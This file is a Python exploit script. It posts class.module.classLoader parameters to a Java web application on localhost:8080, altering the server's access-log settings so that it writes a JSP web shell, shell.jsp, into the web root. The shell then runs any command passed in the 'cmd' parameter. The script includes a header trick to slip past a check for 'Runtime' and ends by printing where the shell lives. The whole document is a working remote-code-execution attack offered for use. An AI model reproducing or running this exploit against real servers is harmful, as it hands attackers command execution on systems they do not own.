import requests
from urllib.parse import urlparse


def run_exploit():
  headers = {
    "prefix": "<%",
    "suffix": "%>//",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    "c": "Runtime",
    "Content-Type": "application/x-www-form-urlencoded"
  }

  log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

  log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
  log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
  log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"
  log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

  data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

  try:
    # Run exploit
    requests.post("http://localhost:8080/example/exploit", headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
  except Exception as e:
    print(e)
    pass


def main():
  try:
    run_exploit()
    print("[+] Exploit completed")
    print("[+] Check your target for a shell")
    print("[+] File: shell.jsp")
    print(f"[+] Shell should be at: http://localhost:8080/shell.jsp?cmd=id")
  except Exception as e:
    print(e)


if __name__ == '__main__':
  main()
